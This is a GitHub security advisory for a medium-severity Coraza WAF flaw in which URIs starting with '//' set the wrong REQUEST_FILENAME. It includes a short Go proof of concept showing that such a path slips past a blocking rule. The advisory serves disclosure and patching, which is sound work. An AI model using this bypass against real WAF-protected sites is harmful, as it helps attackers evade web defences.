# [M] OWASP Coraza WAF has parser confusion which leads to wrong URI in `REQUEST_FILENAME`

## Summary
Severity: Medium
Advisory: GHSA-q9f5-625g-xm39
CVE: CVE-2025-29914
CWE: CWE-706
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2025-03-20
Source: https://github.com/advisories/GHSA-q9f5-625g-xm39
Type: github-advisory

## Affected
- Go: `github.com/jptosso/coraza-waf` — affected >=0 <3.3.3
- Go: `github.com/corazawaf/coraza/v3` — affected >=0 <3.3.3

## Details
### Summary

URLs starting with `//` are not parsed properly, and the request `REQUEST_FILENAME` variable contains a wrong value, leading to potential rules bypass.

### Details

If a request is made on an URI starting with `//`, coraza will set a wrong value in `REQUEST_FILENAME`.
For example, if the URI `//bar/uploads/foo.php?a=b` is passed to coraza: , `REQUEST_FILENAME` will be set to `/uploads/foo.php`.

The root cause is the usage of `url.Parse` to parse the URI in [ProcessURI](https://github.com/corazawaf/coraza/blob/8b612f4e6e18c606e371110227bc7669dc714cab/internal/corazawaf/transaction.go#L768).

`url.Parse` can parse both absolute URLs (starting with a scheme) or relative ones (just the path). 
`//bar/uploads/foo.php` is a valid absolute URI (the scheme is empty), `url.Parse` will consider `bar` as the host and the path will be set to `/uploads/foo.php`.

### PoC

```go
package main

import (
	"fmt"
	"net/url"
	"os"

	"github.com/corazawaf/coraza/v3"
)

const testRule = `
SecDebugLogLevel 9
SecDebugLog /dev/stdout
SecRule REQUEST_FILENAME "@rx /bar/uploads/.*\.(h?ph(p|tm?l?|ar)|module|shtml)" "id:1,phase:1,deny"
`

func main() {
	var testURL = "//bar/uploads/foo.php"

	if os.Getenv("TEST_URL") != "" {
		testURL = os.Getenv("TEST_URL")
	}

	fmt.Printf("Testing URL: %s\n", testURL)

	config := coraza.NewWAFConfig().WithDirectives(testRule)

	waf, err := coraza.NewWAF(config)

	if err != nil {
		panic(err)
	}

	tx := waf.NewTransaction()

	tx.ProcessURI(testURL, "GET", "HTTP/1.1")

	in := tx.ProcessRequestHeaders()

	if in != nil {
		fmt.Printf("%+v\n", in)
	}
}
```

### Impact

Potential bypass of rules using `REQUEST_FILENAME`.

## References
- https://github.com/corazawaf/coraza/security/advisories/GHSA-q9f5-625g-xm39
- https://nvd.nist.gov/vuln/detail/CVE-2025-29914
- https://github.com/corazawaf/coraza/commit/4722c9ad0d502abd56b8d6733c6b47eb4111742d
- https://github.com/corazawaf/coraza
